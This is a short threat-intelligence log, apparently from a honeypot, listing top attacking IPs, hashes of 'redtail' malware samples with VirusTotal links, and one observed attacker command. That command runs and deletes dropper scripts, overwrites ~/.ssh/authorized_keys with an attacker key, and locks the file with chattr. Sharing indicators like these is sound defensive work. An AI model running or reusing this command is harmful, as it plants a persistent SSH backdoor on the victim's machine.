@@ -1,0 +1,34 @@
+Top 5 IPs for 27-10-2024 :
+
+69.85.121.121
+77.222.187.73
+75.111.120.123
+113.88.84.168
+78.71.222.89
+
+
+Malware Observed:
+
+File name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+File name : redtail.arm7
+d4635f0f5ab84af5e5194453dbf60eaebf6ec47d3675cb5044e5746fb48bd4b4
+https://www.virustotal.com/gui/file/d4635f0f5ab84af5e5194453dbf60eaebf6ec47d3675cb5044e5746fb48bd4b4
+
+File name : redtail.arm8
+992cb5a753697ee2642aa390f09326fcdb7fd59119053d6b1bdd35d47e62f472
+https://www.virustotal.com/gui/file/992cb5a753697ee2642aa390f09326fcdb7fd59119053d6b1bdd35d47e62f472
+
+File name : redtail.i686
+69dc9dd8065692ea262850b617c621e6c1361e9095a90b653b26e3901597f586
+https://www.virustotal.com/gui/file/69dc9dd8065692ea262850b617c621e6c1361e9095a90b653b26e3901597f586
+
+File name : redtail.x86_64
+29f8524562c2436f42019e0fc473bd88584234c57979c7375c1ace3648784e4b
+https://www.virustotal.com/gui/file/29f8524562c2436f42019e0fc473bd88584234c57979c7375c1ace3648784e4b
+
+Commands/exploits observed :
+
+chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\";
